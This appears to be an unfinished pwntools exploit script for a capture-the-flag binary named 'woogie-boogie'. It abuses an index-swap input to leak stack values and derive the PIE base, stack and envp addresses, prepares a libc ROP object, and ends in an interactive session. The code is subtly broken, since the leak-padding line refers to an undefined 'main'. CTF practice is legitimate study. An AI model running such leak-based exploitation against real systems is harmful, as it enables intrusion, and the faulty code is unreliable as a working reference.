from pwn import *
import sys

context.terminal = "kitty"
context.gdbinit = "/opt/pwndbg/gdbinit"
context.log_level = "info"        # 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING'
binary = "./woogie-boogie"        ### CHANGE ME !!!!!!!!!!!!!!!!

gdbscript = '''
    b main
'''
def init():
    ## loading custom libc
    # env = {"LD_PRELOAD": "./desired_libc"}
    ## loading custom libc
    if (args.GDB):
        pp = gdb.debug(binary, gdbscript=gdbscript)
    elif (args.REMOTE):
        pp = remote(sys.argv[1], int(sys.argv[2]))
    else :
        pp = process(binary)# env=env)
    return pp

def findip(pp, length):
    cyclic_patt = cyclic(length)
    pp.recv()
    pp.sendline(cyclic_patt)
    pp.wait()
    # offset = cyclic_find(pp.core.pc)
    offset = cyclic_find(pp.corefile.read(pp.core.sp, 4))
    log.info(f"offset found {offset}")

def woogieboogie(adx, bdx):
    pp.recvuntil(b": ")
    pp.sendline(str(adx).encode())
    pp.recvuntil(b": ")
    pp.sendline(str(bdx).encode())

def swap(bytess):
    splbytes = [bytess[i] for i in range (0, len(bytess))]

    for i in range(0, 4):
        tmp = splbytes[i]
        splbytes[i] = splbytes[7 - i]
        splbytes[7 - i] = tmp
    byt = b""
    for i in splbytes :
        byt += i.to_bytes(1)
    return (byt)

def readstack(offset):
    log.info(f"reading offset {offset}")
    # modifying the rip, with start
    woogieboogie(5, 31)
    # getting the fucking main function to leak it lol
    woogieboogie(0, offset)
    # ending it
    woogieboogie(0, 0)
    leak = pp.recvline().rstrip()
    leak += (8 - len(main)) * b'\x00'
    leakaddr = u64(swap(leak))
    return (leakaddr)

def exploit():
    piebase = readstack(7) - elf.sym.main
    log.info(f"piebase {hex(piebase)}")
    stacktop = readstack(6) - 0x1ffb0
    log.info(f"stacktop {hex(stacktop)}")
    envp = stacktop + 0x1ffd8
    log.info(f"envp {hex(envp)}")

    pp.interactive()

if (args.REMOTE):
    libc = ELF("./libc.so.6")
else:
    libc = ELF("/usr/lib/libc.so.6")
libcrops = ROP(libc)
elf = context.binary = ELF(binary)
pp = init()
exploit()
